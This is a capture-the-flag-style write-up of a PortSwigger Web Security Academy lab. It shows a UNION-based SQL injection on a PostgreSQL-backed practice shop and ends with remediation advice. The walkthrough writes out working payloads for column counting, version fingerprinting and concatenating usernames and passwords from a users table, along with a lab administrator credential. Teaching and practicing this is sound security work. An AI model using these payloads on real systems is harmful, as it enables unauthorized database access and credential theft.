```markdown
# Lab: SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column

**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Difficulty:** Practitioner  
**Author:** Mostafa Abdelmonem  

---

## Environment & Tools Used
* **Browser:** Standard Web Browser (Direct URL Parameter Manipulation)
* **Target Application:** E-Commerce Web Application (Category Filter)

---

## Vulnerability Overview & Technical Concept

When executing a `UNION`-based SQL injection attack, the injected query must match the exact number and data type structure of the original query. Frequently, an attacker needs to extract multiple data fields (such as a username and password) from a database table, but the application only displays a single column or has strict data type constraints (e.g., combining strings and integers). 

In **PostgreSQL**, string concatenation operators like `||` can be leveraged to merge multiple columns or string values into a single logical column, bypassing layout and type restrictions to retrieve multiple sensitive attributes simultaneously.

---

## Step-by-Step Exploitation Walkthrough

### Step 1: Endpoint & Parameter Identification
Navigated to the application and selected the **"Gifts"** category filter. The request structure in the URL bar was observed:

```http
[https://target-app.web-security-academy.net/filter?category=Gifts](https://target-app.web-security-academy.net/filter?category=Gifts)

```

Appended a single quote (`'`) to test for syntax errors:

* **Payload:** `/filter?category=Gifts'`
* **Response:** `HTTP 500 Internal Server Error`
* **Analysis:** The application failed to handle the unescaped quote, confirming that user input is directly concatenated into the backend SQL query (likely resembling `SELECT * FROM category WHERE category = 'Gifts'`).

---

### Step 2: Determining Column Count (`NULL` Injection)

To prepare a `UNION` query, the column count of the original query must match. Appended `NULL` placeholders to align columns:

* **Single Column Test:** `/filter?category=Gifts'+UNION+SELECT+NULL--+-` (Resulted in a column count mismatch error).
* **Two Columns Test:** `/filter?category=Gifts'+UNION+SELECT+NULL,NULL--+-`
* **Outcome:** The page rendered normally with a `200 OK` status, confirming the backend query expects **two columns**.

---

### Step 3: Database Version Fingerprinting

Leveraged the database-specific version function to identify the underlying DBMS engine:

```http
/filter?category=Gifts'+UNION+SELECT+NULL,version()--+-

```

* **Outcome:** Successfully rendered the database version string (`PostgreSQL 12.22`), indicating a PostgreSQL backend.

---

### Step 4: Data Type Discovery

Tested the data types expected by each column position to structure the data extraction payload properly:

* **Test:** `/filter?category=Gifts'+UNION+SELECT+'a','a'--+-` (Returned an error due to type mismatch).
* **Test:** `/filter?category=Gifts'+UNION+SELECT+NULL,'a'--+-`
* **Outcome:** The page loaded successfully, revealing that the **first column accepts integer/null types** and the **second column accepts string types**.

---

### Step 5: String Concatenation for Multi-Value Extraction

Because the application only displays results within specific column formats, extracting both `username` and `password` fields separately is restricted. Utilizing PostgreSQL's concatenation operator (`||`), both columns were combined into a single string stream within the string-compatible column position:

```http
/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--+-

```

#### Detailed Payload Mechanics:

* `'+`: Closes the original string parameter context and URL-encodes the space character.
* `UNION SELECT`: Merges the original query results with the injected query.
* `NULL, username||'~'||password`: Satisfies the two-column structure while concatenating the `username` and `password` fields from the `users` table into a single output column separated by a delimiter (`~` or `|`).
* `FROM+users`: Specifies the target table containing administrative credentials.
* `--+-`: Comments out the remainder of the original backend SQL query.

---

## Proof of Concept (PoC) & Exploitation Result

* **Extracted Data:** Executing the concatenated GET request rendered the user records directly on the page, successfully exposing the administrator credentials (e.g., `administrator|ko901hd6k1flb2am1yqe`).
* **Impact:** Successful extraction of administrative authentication details using string concatenation in a restricted multi-column environment.
* **Lab Resolution:** Used the extracted administrator credentials to log into the application and complete the lab.

---

## Remediation & Mitigation

1. **Use Parameterized Queries (Prepared Statements):**
Ensure user-supplied input is treated strictly as data values rather than executable query statements, neutralizing SQL injection vectors entirely.
2. **Data Minimization and Access Control:**
Limit database account privileges so that web applications can only access necessary tables and columns, preventing arbitrary data dumping from sensitive tables like `users`.

```

```
